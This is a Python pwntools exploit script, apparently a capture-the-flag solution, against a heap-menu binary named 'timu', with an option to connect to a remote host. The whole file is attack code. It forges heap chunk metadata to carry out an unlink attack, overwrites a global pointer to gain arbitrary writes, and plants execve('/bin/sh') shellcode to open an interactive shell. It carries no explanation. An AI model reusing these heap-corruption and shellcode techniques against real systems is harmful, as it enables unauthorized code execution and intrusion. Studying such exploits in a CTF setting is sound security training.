from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
if len(sys.argv) == 1 or sys.argv[1] == 'l':
    p = process('./timu')
    elf = ELF('./timu')
else:
    p = remote('61.147.171.105', 57981)
    elf = ELF('./timu')
    pause()
context(arch = "amd64", os = 'linux')
bss_stage=elf.bss()+0x70
buf_addr=0x000000000601040
bss_addr=elf.bss()
def create(size,data):
    p.recvuntil(b'Your choice :')
    p.sendline(b'1')
    p.recvuntil(b'Size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'Data: ')
    p.sendline(data)
def delete(index):
    p.recvuntil(b'Your choice :')
    p.sendline(b'2')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
def change(index,size,data):
    p.recvuntil(b'Your choice :')
    p.sendline(b'3')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'Data: ')
    p.sendline(data)

create(0x100,b'a'*0x100)
create(0x100,b'b'*0x100)
payload=p64(0)+p64(0x101)
payload+=p64(buf_addr-0x18)+p64(buf_addr-0x10)
payload+=b'a'*0xe0+p64(0x100)+p64(0x110)
change(0,len(payload),payload)
# pause()
delete(1)
pause()
payload=p64(0)*3+p64(bss_addr)+p64(buf_addr)+p64(0)*3+p64(0x20)
change(0,len(payload),payload)
# pause()
create(0x100,b'c'*0x100)
create(0x100,b'd'*0x100)
print('create two')
# pause()
delete(2)
# pause()
payload=p64(0)+p64(buf_addr+0x20)
change(2,len(payload),payload)

create(0x100,b'e'*0x100)
print('create e')
# pause()
payload = p64(bss_addr) + p64(buf_addr)
payload += p64(0) * 4
payload += b"\x10"
change(1, len(payload), payload)
# pause()
# shellcode = asm(shellcraft.sh())
shellcode=b'/bin/sh\x00'
shellcode+=asm('xor rax,rax;add rax,0x3b;xor rsi,rsi;xor rdx,rdx;xor rdi,rdi;add rdi,0x000000000601020;syscall')
change(0, len(shellcode), shellcode)
print("shell")
# pause()
change(6, 0x8, p64(bss_addr+8))
pause()
# create(0x10, b"x"*0x10)
# pause()
p.interactive()